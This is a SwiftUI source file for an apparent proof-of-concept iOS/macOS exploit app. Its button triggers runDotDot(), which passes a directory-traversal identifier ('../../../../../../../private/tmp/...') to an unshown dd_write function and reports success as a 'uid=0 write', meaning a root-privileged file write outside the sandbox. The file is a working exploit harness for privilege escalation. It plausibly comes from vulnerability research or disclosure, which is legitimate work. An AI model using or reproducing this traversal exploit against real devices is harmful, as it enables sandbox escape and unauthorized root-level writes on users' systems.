import SwiftUI

struct ContentView: View {
    @State private var showAlert = false
    @State private var alertTitle = ""
    @State private var alertMessage = ""
    @State private var running = false

    var body: some View {
        VStack(spacing: 20) {
            Text("Hello World")
                .font(.largeTitle)
            Button("OK Bommer") {
                runDotDot()
            }
            .buttonStyle(.borderedProminent)
            .disabled(running)

            if running {
                ProgressView()
                    .padding(.top, 8)
            }
        }
        .frame(maxWidth: .infinity, maxHeight: .infinity)
        .alert(alertTitle, isPresented: $showAlert) {
            Button("OK") {}
        } message: {
            Text(alertMessage)
        }
    }

    private func runDotDot() {
        running = true
        Task.detached {
            let ts = Int(Date().timeIntervalSince1970)
            let name = "poc_\(ts)"
            let targetPath = "/private/tmp/\(name)"
            let identifier = "../../../../../../../private/tmp/\(name)"

            let result = dd_write(identifier, targetPath)

            await MainActor.run {
                running = false
                if result == 0 {
                    alertTitle = "Success"
                    alertMessage = "uid=0 write at \(targetPath)"
                } else {
                    alertTitle = "Failed"
                    alertMessage = "dd_write returned \(result)"
                }
                showAlert = true
            }
        }
    }
}
